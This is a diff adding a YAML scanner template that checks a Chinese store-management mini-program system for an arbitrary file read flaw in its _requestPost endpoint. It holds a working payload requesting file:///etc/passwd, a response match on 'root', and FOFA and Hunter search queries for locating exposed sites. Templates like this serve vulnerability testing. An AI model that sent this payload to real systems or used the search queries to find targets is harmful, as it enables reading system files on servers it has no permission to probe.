@@ -1,0 +1,16 @@
+name: wnmd-fileread  #万能门店小程序管理系统
+rules: 
+  - method: GET
+    path: /api/wxapps/_requestPost?data=1&url=file:///etc/passwd
+    headers:
+      Content-Type: 
+    body: 
+    expression:                        
+      status_code: 200                 
+      response_header:              
+      response_body: root                   
+detail:                          
+  description: "万能门店小程序管理系统_requestPost接口存在任意文件读取漏洞。"
+  search:             
+    fofa: body="/com/css/head_foot.css" || body="/com/css/iconfont"
+    鹰图: web.body="/com/css/head_foot.css" or web.body="/com/css/iconfont"
